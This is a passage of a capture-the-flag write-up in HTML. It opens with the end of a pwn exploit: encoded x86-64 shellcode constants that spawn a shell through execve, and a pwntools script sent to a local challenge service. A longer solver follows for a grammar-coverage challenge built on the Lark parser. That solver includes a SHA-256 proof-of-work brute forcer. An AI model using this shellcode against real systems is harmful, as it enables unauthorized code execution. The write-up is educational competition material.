+    a = <span class="hljs-number">0x686e00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x687300c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686800c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x680000c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04eb5f54</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rdi</span>
+    a = <span class="hljs-number">0x04ebf631</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span>
+    a = <span class="hljs-number">0x04ebd231</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>
+    a = <span class="hljs-number">0x04ebc031</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>
+    a = <span class="hljs-number">0x050f3bb0</span>  #<span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3b</span><span class="hljs-comment">;      syscall</span>
+
+def overwriteRIP(num1,num2,num3,num4,num5):
+    x = num1
+    x = num2
+    x = num3
+    x = num4
+    x = num5
+    num3+=<span class="hljs-number">0x10</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+r = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40404</span>)
+r<span class="hljs-number">.</span>sendlineafter(<span class="hljs-string">&#x27;&lt;xxx&gt;`.\n&#x27;</span>,code+<span class="hljs-string">&#x27;EOF&#x27;</span>)
+r<span class="hljs-number">.</span>interactive()
+
+#flag{secure_jit_again_see_you_in_2022}
+</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="how-to-generate"><a class="header-link" href="#how-to-generate"></a>how to generate</h3>
+<h4 id="intro-1"><a class="header-link" href="#intro-1"></a>INTRO</h4>
+<p>This is a challenge which use python lark module to generate random grammer.
+This is the code for generating grammer:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_grammar</span>():</span>
+    gram = <span class="hljs-string">&#x27;&#x27;&#x27;%import common.LETTER
+%import common.WORD
+%import common.NUMBER
+%import common.DIGIT
+%import common.WS
+%ignore WS
+
+start: statement+
+
+&#x27;&#x27;&#x27;</span>
+    num = <span class="hljs-number">0</span>
+    exprs = <span class="hljs-string">&quot;expression: &quot;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span>:
+            exprs += <span class="hljs-string">&quot;    | &quot;</span>
+        exprs += genexpr()
+        exprs += <span class="hljs-string">&quot;-&gt; cov_%d&quot;</span> % num
+        num += <span class="hljs-number">1</span>
+        exprs += <span class="hljs-string">&quot;\n&quot;</span>
+    gram += exprs
+    stmts = <span class="hljs-string">&quot;statement: &quot;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
+        <span class="hljs-keyword">if</span> i!= <span class="hljs-number">0</span>:
+            stmts += <span class="hljs-string">&quot;    | &quot;</span>
+        stmts += genstmt()
+        stmts += <span class="hljs-string">&quot;-&gt; cov_%d&quot;</span> % num
+        num += <span class="hljs-number">1</span>
+        stmts += <span class="hljs-string">&quot;\n&quot;</span>
+    gram += stmts
+    <span class="hljs-keyword">return</span> gram</code></pre><p>genexpr() generate grammer of expression
+EX:</p>
+<pre class="hljs"><code>LETTER <span class="hljs-string">&quot;+&quot;</span> <span class="hljs-built_in">WORD</span> <span class="hljs-string">&quot;%&quot;</span> DIGIT -&gt; cov_0
+<span class="hljs-built_in">WORD</span> <span class="hljs-string">&quot;@&quot;</span> LETTER <span class="hljs-string">&quot;%&quot;</span> LETTER <span class="hljs-string">&quot;-&quot;</span> DIGIT -&gt; cov_1
+NUMBER <span class="hljs-string">&quot;@&quot;</span> <span class="hljs-built_in">WORD</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-built_in">WORD</span> -&gt; cov_2</code></pre><p>genstmt() generate grammer of statement
+EX:</p>
+<pre class="hljs"><code><span class="hljs-string">&quot;OBzXJ4&quot;</span> <span class="hljs-keyword">expression</span> statement <span class="hljs-string">&quot;pEe&quot;</span> <span class="hljs-keyword">expression</span> <span class="hljs-string">&quot;Iowp1L&quot;</span> NUMBER WORD -&gt; cov_51
+<span class="hljs-string">&quot;OwO&quot;</span> <span class="hljs-keyword">expression</span> <span class="hljs-string">&quot;dvL6&quot;</span> LETTER <span class="hljs-string">&quot;Vr0czr&quot;</span> <span class="hljs-keyword">expression</span> <span class="hljs-string">&quot;dsnwh9&quot;</span> DIGIT <span class="hljs-string">&quot;hNeOhJ&quot;</span> -&gt; cov_52
+<span class="hljs-string">&quot;Vqg&quot;</span> statement <span class="hljs-string">&quot;1rAxJM&quot;</span> <span class="hljs-keyword">expression</span> <span class="hljs-string">&quot;y8ek4&quot;</span> <span class="hljs-keyword">expression</span> <span class="hljs-string">&quot;LVdgiw&quot;</span> <span class="hljs-keyword">expression</span> -&gt; cov_53</code></pre><p>So we need to generate sentences which map the given grammer.</p>
+<h4 id="collect_cov"><a class="header-link" href="#collect_cov"></a>Collect_cov</h4>
+<p>After we generate valid sentence, it will record the &quot;rule&#39;s layer&quot; we use.</p>
+<pre class="hljs"><code>def collect_cov(ast):
+    <span class="hljs-built_in">cov</span> = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">if</span> isinstance(ast, lark.tree.Tree):
+        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> ast.children:
+            <span class="hljs-built_in">cov</span> |= collect_cov(ch)
+        <span class="hljs-keyword">if</span> ast.data.startswith(&#x27;cov_&#x27;):
+            <span class="hljs-built_in">num</span> = int(ast.data[<span class="hljs-number">4</span>:])
+            <span class="hljs-built_in">cov</span> |= (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-built_in">num</span>)
+    <span class="hljs-built_in">return</span> <span class="hljs-built_in">cov</span></code></pre><h4 id="target"><a class="header-link" href="#target"></a>Target</h4>
+<p>We need to match these goals.</p>
+<ul class="list">
+<li>Generate 4096 valid sentences</li>
+<li>Each sentence should match more than 20 rules</li>
+<li>Each sentence&#39;s <code>cov</code> should not be same</li>
+<li>Union all the sentence, we should use all the rules.</li>
+</ul>
+<h4 id="solution"><a class="header-link" href="#solution"></a>Solution</h4>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> zlib
+random.seed (<span class="hljs-number">1000</span>)
+
+<span class="hljs-string">&#x27;&#x27;&#x27;
+- rules are store in _dict
+
+- _dict:
+  { cov_num : {&#x27;sentence&#x27;: string, &#x27;stateCnt&#x27;: number, &#x27;expCnt&#x27;: number} }
+
+- sentence : if exist statement, replace it as &#x27;s&#x27;
+             if exist expression, replace it as &#x27;e&#x27;
+             if exist LETTER, replace it as &#x27;a&#x27;
+             if exist WORD, replace it as &#x27;b&#x27;
+             if exist NUMBER, replace it as &#x27;1&#x27;
+             if exist DIGIT, replace it as &#x27;2&#x27;
+&#x27;&#x27;&#x27;</span>
+
+_<span class="hljs-built_in">dict</span> = {}
+MAX_DEPTH = <span class="hljs-number">20</span>
+exp_0_cnt = <span class="hljs-number">0</span>
+st_0_cnt = <span class="hljs-number">0</span>
+
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> itertools
+<span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> sys
+
+charset = (string.ascii_letters + string.digits).encode()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker</span>(<span class="hljs-params">args</span>):</span>
+    prefix, _posfix, _<span class="hljs-built_in">hash</span> = args
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):
+        x = <span class="hljs-built_in">bytes</span>((prefix,)+x)
+        <span class="hljs-keyword">if</span> _<span class="hljs-built_in">hash</span> == hashlib.sha256(x+_posfix).hexdigest():
+            <span class="hljs-keyword">return</span> x, <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_sha256</span>(<span class="hljs-params">m</span>):</span>
+    _<span class="hljs-built_in">hash</span> = m.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>).strip(<span class="hljs-string">&#x27;\n&#x27;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>]
+    _posfix = m.strip(<span class="hljs-string">b&#x27;\n&#x27;</span>).split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">12</span>:-<span class="hljs-number">1</span>]
+    <span class="hljs-built_in">print</span>(_<span class="hljs-built_in">hash</span>, _posfix)
+
+    candidates = [(e, _posfix, _<span class="hljs-built_in">hash</span>) <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> charset]
+    <span class="hljs-keyword">with</span> mp.Pool(<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> pool:
+        <span class="hljs-keyword">for</span> x, ok <span class="hljs-keyword">in</span> pool.imap_unordered(worker, candidates):
+            <span class="hljs-keyword">if</span> ok:
+                <span class="hljs-keyword">return</span> x.decode()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_rule</span>(<span class="hljs-params">_dict, m</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_statement</span>(<span class="hljs-params">_dict, lines</span>):</span>
+        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
+            line = line.replace(<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
+            sentence = <span class="hljs-string">&#x27;&#x27;</span>
+            e_cnt = <span class="hljs-number">0</span>
+            s_cnt = <span class="hljs-number">0</span>
+            tokens = line.split(<span class="hljs-string">&#x27; &#x27;</span>)
+            <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> tokens:
+                <span class="hljs-keyword">if</span> token == <span class="hljs-string">&#x27;LETTER&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;a &#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;WORD&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;b &#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;NUMBER&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;1 &#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;DIGIT&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;2 &#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;expression&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;e &#x27;</span>
+                    e_cnt += <span class="hljs-number">1</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;statement&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;s &#x27;</span>
+                    s_cnt += <span class="hljs-number">1</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;statement:&#x27;</span>:
+                    <span class="hljs-keyword">continue</span>
+                <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;cov&#x27;</span> <span class="hljs-keyword">in</span> token:
+                    number = <span class="hljs-built_in">int</span>(token[<span class="hljs-number">4</span>:])
+                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(token) &gt; <span class="hljs-number">2</span>:
+                    sentence += token + <span class="hljs-string">&#x27; &#x27;</span>
+            _<span class="hljs-built_in">dict</span>[number] = {<span class="hljs-string">&#x27;sentence&#x27;</span>: sentence, <span class="hljs-string">&#x27;stateCnt&#x27;</span>: s_cnt, <span class="hljs-string">&#x27;expCnt&#x27;</span>: e_cnt}
+        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">dict</span>    
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_expession</span>(<span class="hljs-params">_dict, lines</span>):</span>
+        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
+            line = line.replace(<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
+            sentence = <span class="hljs-string">&#x27;&#x27;</span>
+            cnt = <span class="hljs-number">0</span>
+            tokens = line.split(<span class="hljs-string">&#x27; &#x27;</span>)
+            <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> tokens:
+                <span class="hljs-keyword">if</span> token == <span class="hljs-string">&#x27;LETTER&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;a&#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;WORD&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;b&#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;NUMBER&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;1&#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;DIGIT&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;2&#x27;</span>
+                <span class="hljs-keyword">elif</span> token == <span class="hljs-string">&#x27;expression&#x27;</span>:
+                    sentence += <span class="hljs-string">&#x27;e&#x27;</span>
+                    cnt += <span class="hljs-number">1</span>
+                <span class="hljs-keyword">elif</span> token <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;!@#$%^&amp;*-+~&quot;</span>:
+                    sentence += token
+                <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;cov&#x27;</span> <span class="hljs-keyword">in</span> token:
+                    number = <span class="hljs-built_in">int</span>(token[<span class="hljs-number">4</span>:])
+            sentence = <span class="hljs-string">&#x27; &#x27;</span>.join(sentence)
+            _<span class="hljs-built_in">dict</span>[number] = {<span class="hljs-string">&#x27;sentence&#x27;</span>: sentence, <span class="hljs-string">&#x27;stateCnt&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expCnt&#x27;</span>: cnt}
+        
+        <span class="hljs-keyword">return</span> _<span class="hljs-built_in">dict</span>  
+    
+    lines = m.split(<span class="hljs-string">&#x27;\n&#x27;</span>)
+    _<span class="hljs-built_in">dict</span> = parse_expession(_<span class="hljs-built_in">dict</span>, lines[<span class="hljs-number">10</span>:<span class="hljs-number">60</span>])
+    _<span class="hljs-built_in">dict</span> = parse_statement(_<span class="hljs-built_in">dict</span>, lines[<span class="hljs-number">60</span>:<span class="hljs-number">160</span>]) 
+    <span class="hljs-keyword">return</span> _<span class="hljs-built_in">dict</span>  
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">_dict</span>):</span>
+    <span class="hljs-keyword">global</span> exp_0_cnt, st_0_cnt
+    tot = <span class="hljs-number">0</span>
+    ans = []
+    record = <span class="hljs-built_in">set</span>()
+    big_record = <span class="hljs-built_in">set</span>()
+    exp_0 = []
+    st_0 = []
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_statement</span>(<span class="hljs-params">s, _dict, tot, ans, depth</span>):</span>
+        <span class="hljs-comment"># pause()</span>
+        <span class="hljs-keyword">global</span> exp_0_cnt
+        <span class="hljs-keyword">global</span> st_0_cnt
+        depth += <span class="hljs-number">1</span>
+        tot += s[<span class="hljs-string">&#x27;stateCnt&#x27;</span>] + s[<span class="hljs-string">&#x27;expCnt&#x27;</span>]
+        ans = ans.replace(<span class="hljs-string">&#x27; s &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + s[<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+        <span class="hljs-comment"># print(ans)</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s[<span class="hljs-string">&#x27;stateCnt&#x27;</span>]):
+            <span class="hljs-keyword">if</span>(tot &gt; <span class="hljs-number">20</span>) <span class="hljs-keyword">or</span> (depth &gt;= MAX_DEPTH):
+                <span class="hljs-comment"># print(st_0_cnt)</span>
+                record.add(st_0_cnt)
+                ans, tot = add_statement(_<span class="hljs-built_in">dict</span>[st_0_cnt], _<span class="hljs-built_in">dict</span>, tot, ans, depth)                
+                st_0_cnt = random.choice(st_0)
+            <span class="hljs-keyword">else</span>:
+                num = random.randint(<span class="hljs-number">51</span>, <span class="hljs-number">149</span>)
+                <span class="hljs-comment"># print(num)</span>
+                record.add(num)
+                ans, tot = add_statement(_<span class="hljs-built_in">dict</span>[num], _<span class="hljs-built_in">dict</span>, tot, ans, depth)
+
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s[<span class="hljs-string">&#x27;expCnt&#x27;</span>]):
+            <span class="hljs-keyword">if</span>(tot &gt; <span class="hljs-number">20</span>) <span class="hljs-keyword">or</span> (depth &gt;= MAX_DEPTH):
+                <span class="hljs-comment"># print(exp_0_cnt)</span>
+                record.add(exp_0_cnt)
+                ans, tot = add_expression(_<span class="hljs-built_in">dict</span>[exp_0_cnt], _<span class="hljs-built_in">dict</span>, tot, ans, depth)
+                exp_0_cnt = random.choice(exp_0)
+            <span class="hljs-keyword">else</span>:
+                num = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">49</span>)
+                <span class="hljs-comment"># print(num)</span>
+                record.add(num)
+                ans, tot = add_expression(_<span class="hljs-built_in">dict</span>[num], _<span class="hljs-built_in">dict</span>, tot, ans, depth)
+        <span class="hljs-keyword">return</span> ans, tot
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_expression</span>(<span class="hljs-params">s, _dict, tot, ans, depth</span>):</span>
+        <span class="hljs-comment"># pause()</span>
+        <span class="hljs-keyword">global</span> exp_0_cnt
+        depth += <span class="hljs-number">1</span>
+        tot += s[<span class="hljs-string">&#x27;expCnt&#x27;</span>]
+        ans = ans.replace(<span class="hljs-string">&#x27; e &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + s[<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+        <span class="hljs-comment"># print(ans)</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s[<span class="hljs-string">&#x27;expCnt&#x27;</span>]):
+            <span class="hljs-keyword">if</span>(tot &gt; <span class="hljs-number">20</span>) <span class="hljs-keyword">or</span> (depth &gt;= MAX_DEPTH):
+                <span class="hljs-comment"># print(exp_0_cnt)    </span>
+                record.add(exp_0_cnt)
+                ans, tot = add_expression(_<span class="hljs-built_in">dict</span>[exp_0_cnt], _<span class="hljs-built_in">dict</span>, tot, ans, depth)
+                exp_0_cnt = random.choice(exp_0)
+            <span class="hljs-keyword">else</span>:
+                num = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">49</span>)
+                <span class="hljs-comment"># print(num)</span>
+                record.add(num)
+                ans, tot = add_expression(_<span class="hljs-built_in">dict</span>[num],_<span class="hljs-built_in">dict</span>, tot, ans, depth)
+        <span class="hljs-keyword">return</span> ans, tot
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findUsefulstatement</span>(<span class="hljs-params">_dict, ans</span>):</span>
+        <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> ans:
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>, <span class="hljs-number">150</span>):
+                <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;stateCnt&#x27;</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;expCnt&#x27;</span>] == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;sentence&#x27;</span>] <span class="hljs-keyword">in</span> el:
+                        <span class="hljs-keyword">return</span> i, el
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>
+    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findUsefulexpression</span>(<span class="hljs-params">_dict, ans</span>):</span>
+        <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> ans:
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+                <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;stateCnt&#x27;</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;expCnt&#x27;</span>] == <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;sentence&#x27;</span>] <span class="hljs-keyword">in</span> el:
+                        <span class="hljs-keyword">return</span> i, el
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>
+    <span class="hljs-comment"># Find out expression which doesn&#x27;t has any expression inside.</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+        <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;expCnt&#x27;</span>] == <span class="hljs-number">0</span> :
+            exp_0.append(i)
+    <span class="hljs-comment"># Find out statement which doesn&#x27;t has any statement or expression inside.</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>, <span class="hljs-number">150</span>):
+        <span class="hljs-keyword">if</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;expCnt&#x27;</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> _<span class="hljs-built_in">dict</span>[i][<span class="hljs-string">&#x27;stateCnt&#x27;</span>] == <span class="hljs-number">0</span> :
+            st_0.append(i)
+
+    table = []
+    record = <span class="hljs-built_in">set</span>()
+    tot = <span class="hljs-number">0</span>
+    <span class="hljs-comment"># get random valid sentence</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">4096</span> - <span class="hljs-number">150</span>)):
+        record = <span class="hljs-built_in">set</span>()
+        tot = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(record) &lt; <span class="hljs-number">20</span>:
+            record = <span class="hljs-built_in">set</span>()
+            tot = <span class="hljs-number">0</span>
+            sentence, tot = add_statement(_<span class="hljs-built_in">dict</span>[random.randint(<span class="hljs-number">50</span>,<span class="hljs-number">149</span>)], _<span class="hljs-built_in">dict</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27; s &#x27;</span>, <span class="hljs-number">0</span>)
+            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27; e&#x27;</span> <span class="hljs-keyword">in</span> sentence) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27; s&#x27;</span> <span class="hljs-keyword">in</span> sentence):
+                tot = <span class="hljs-number">0</span>
+                record = <span class="hljs-built_in">set</span>()
+            <span class="hljs-keyword">elif</span>  record <span class="hljs-keyword">in</span> table:
+                tot = <span class="hljs-number">0</span>
+                record = <span class="hljs-built_in">set</span>()
+        table.append(record)
+        big_record = big_record.union(record)
+        ans.append(sentence[<span class="hljs-number">1</span>:])
+    <span class="hljs-comment"># check how many con_num have we get.</span>
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(big_record))
+    <span class="hljs-comment"># get miss list</span>
+    miss = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):
+        <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> big_record):
+            miss.append(i)
+    <span class="hljs-comment"># print out miss list</span>
+    <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> miss:
+        <span class="hljs-built_in">print</span>(el, _<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;stateCnt&#x27;</span>], _<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;expCnt&#x27;</span>])
+    <span class="hljs-comment"># find useful statement and useful expression for patching</span>
+    usefulstIdx, usefulstSentence = findUsefulstatement(_<span class="hljs-built_in">dict</span>, ans)
+    usefulexpIdx, usefulexpSentence = findUsefulexpression(_<span class="hljs-built_in">dict</span>, ans)
+    <span class="hljs-comment"># patch</span>
+    <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> miss:
+        <span class="hljs-keyword">if</span> el &gt; <span class="hljs-number">49</span>:
+            target_sentence = usefulstSentence.replace(<span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[usefulstIdx][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(_<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;stateCnt&#x27;</span>]):
+                target_sentence = target_sentence.replace(<span class="hljs-string">&#x27; s &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[usefulstIdx][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(_<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;expCnt&#x27;</span>]):
+                target_sentence = target_sentence.replace(<span class="hljs-string">&#x27; e &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[usefulexpIdx][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+            ans.append(target_sentence)
+        <span class="hljs-keyword">else</span>:
+            target_sentence = usefulexpSentence.replace(<span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[usefulexpIdx][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
